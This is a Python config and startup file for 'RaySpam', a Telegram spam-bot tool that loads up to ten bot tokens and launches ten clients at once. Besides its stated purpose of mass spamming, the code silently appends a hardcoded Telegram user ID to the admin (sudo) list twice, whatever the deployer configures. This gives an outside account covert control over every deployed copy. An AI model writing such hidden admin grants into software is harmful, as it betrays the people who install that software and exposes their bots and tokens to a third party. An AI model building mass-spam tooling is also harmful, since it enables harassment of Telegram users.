# RaySpam - Spam Userbots
# Copyright © 2021 @Funtwenty4

import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

rayversion = "v0.0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1203329759 not in SUDO_USERS:
    SUDO_USERS.append(1203329759)

# Tokens

Ray = TelegramClient('Ray', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

Ray2 = TelegramClient('Ray2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

Ray3 = TelegramClient('Ray3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

Ray4 = TelegramClient('Ray4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

Ray5 = TelegramClient('Ray5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

Ray6 = TelegramClient('Ray6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

Ray7 = TelegramClient('Ray7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

Ray8 = TelegramClient('Ray8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

Ray9 = TelegramClient('Ray9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

Ray10 = TelegramClient('Ray10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

SUDO_USERS.append(1203329759)
